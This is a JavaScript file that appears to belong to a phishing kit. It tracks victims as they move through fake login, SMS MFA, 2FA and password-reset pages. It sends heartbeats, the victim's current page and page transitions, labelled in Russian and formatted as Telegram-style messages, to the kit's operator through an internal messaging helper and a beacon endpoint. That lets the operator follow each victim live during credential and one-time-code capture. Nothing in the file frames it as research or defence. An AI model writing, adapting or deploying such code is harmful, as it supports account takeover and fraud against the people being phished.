﻿(function () {
  var INTERVAL = 12000;

  var siteId = sessionStorage.getItem("ka_site_id") || "";
  if (!siteId) return;

  var path = window.location.pathname.split("/").pop().replace(".html","") || "index";
  var pageNames = {
    "index":            "🔑 Login",
    "login":            "🔑 Login",
    "sms":              "📱 MFA SMS",
    "sms_reset":        "📱 MFA Reset",
    "2fa":              "🔐 2FA",
    "forgot":           "🔄 Reset",
    "forgot_code":      "🔄 Reset Code",
    "new_password":     "🔑 New Password",
    "password_changed": "✅ Passwort geändert",
    "success":          "✅ Success",
    "verified":         "✅ Verified",
    "waiting":          "⏳ Waiting",
    "waiting2fa":       "⏳ Waiting 2FA"
  };
  var pageName = pageNames[path] || ("📌 " + path);

  function getMsgId() {
    var id = sessionStorage.getItem("ka_msg_id");
    return id ? parseInt(id) : null;
  }

  var lastOnline = null;
  var lastMsgId  = null;

  function updateStatus(online) {
    var msgId = getMsgId();
    if (lastOnline === online && lastMsgId === msgId) return;
    lastOnline = online;
    lastMsgId  = msgId;
    window.KA && KA.heartbeat(siteId, msgId, online, pageName);
  }

  function logPageVisit() {
    if (path === "index" || path === "login") return;
    var prevPage = sessionStorage.getItem("ka_prev_page") || "🔑 Login";
    sessionStorage.setItem("ka_prev_page", pageName);
    var text =
      "📌 <b>Переход:</b> " + prevPage + " → " + pageName + "\n" +
      "🆔 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "🕒 " + new Date().toLocaleString("de-DE");
    window.KA && KA.sendMessage(text);
  }

  updateStatus(true);
  logPageVisit();

  var hbTimer = setInterval(function () {
    updateStatus(true);
  }, INTERVAL);

  window.addEventListener("beforeunload", function () {
    clearInterval(hbTimer);
    var msgId = getMsgId();
    if (!msgId) return;
    // sendBeacon через наш API
    var body = JSON.stringify({ siteId: siteId, msgId: msgId, online: false, pageName: pageName });
    navigator.sendBeacon("/api/ping", new Blob([body], { type: "application/json" }));
  });

  document.addEventListener("visibilitychange", function () {
    updateStatus(!document.hidden);
  });
})();
